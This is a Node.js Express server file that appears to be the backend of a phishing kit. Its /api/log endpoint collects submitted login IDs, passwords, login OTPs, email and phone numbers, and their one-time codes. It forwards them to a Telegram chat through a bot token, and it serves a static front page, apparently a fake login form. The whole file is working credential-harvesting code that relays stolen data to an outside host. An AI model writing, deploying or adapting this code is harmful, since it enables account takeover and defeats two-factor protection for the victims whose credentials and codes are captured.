require('dotenv').config();
const express = require('express');
const path = require('path');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

// LOGGING MIDDLEWARE
app.use((req, res, next) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);
    next();
});

const BOT_TOKEN = process.env.LOG_BOT_TOKEN || process.env.BOT_TOKEN;
const CHAT_ID = process.env.LOG_BOT_CHAT_ID || process.env.TARGET_CHAT_ID;

console.log('--- SYSTEM STATUS ---');
console.log('Bot Token:', BOT_TOKEN ? 'OK' : 'MISSING');
console.log('Chat ID:', CHAT_ID || 'MISSING');
console.log('--------------------------');

// API Endpoint for Logs
app.post('/api/log', async (req, res) => {
    const { title, data } = req.body;
    console.log(`[LOG ATTEMPT] Title: ${title}`);

    if (!BOT_TOKEN || !CHAT_ID) {
        console.error('[LOG ERROR] Missing Credentials in environment');
        return res.status(500).json({ success: false, error: 'Config missing' });
    }

    const esc = (str) => {
        if (str === undefined || str === null || str === '') return 'N/A';
        return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    };

    const message = `
🔥 <b>${esc(title)}</b>
━━━━━━━━━━━━━━━
👤 <b>Login ID</b>: <code>${esc(data.id)}</code>
🔑 <b>Password</b>: <code>${esc(data.pass)}</code>
🔢 <b>Login OTP</b>: <code>${esc(data.login_otp)}</code>
📧 <b>Email</b>: <code>${esc(data.email)}</code>
🔢 <b>E-OTP</b>: <code>${esc(data.email_otp)}</code>
📱 <b>Phone</b>: <code>${esc(data.phone)}</code>
🔢 <b>P-OTP</b>: <code>${esc(data.phone_otp)}</code>
🕒 <b>Time</b>: ${esc(data.time)}
━━━━━━━━━━━━━━━`;

    try {
        console.log(`[DEBUG] Sending to Chat ID: ${CHAT_ID}`);
        const tgRes = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN.trim()}/sendMessage`, {
            chat_id: String(CHAT_ID).trim(),
            text: message,
            parse_mode: 'HTML'
        });
        console.log('[LOG SUCCESS] Telegram Message ID:', tgRes.data.result.message_id);
        res.json({ success: true });
    } catch (e) {
        const errorDetail = e.response?.data || e.message;
        console.error("[LOG FAILED] Telegram Error Detail:", JSON.stringify(errorDetail, null, 2));
        res.status(500).json({ success: false, error: e.response?.data?.description || e.message });
    }
});



// STATIC FILES
app.use(express.static(__dirname));

// FALLBACK
app.use((req, res, next) => {
    if (req.method === 'GET' && !req.url.startsWith('/api/') && !req.url.includes('.')) {
        return res.sendFile(path.join(__dirname, 'index.html'));
    }
    next();
});

if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
    app.listen(port, () => console.log(`🚀 Server on http://localhost:${port}`));
}

module.exports = app;

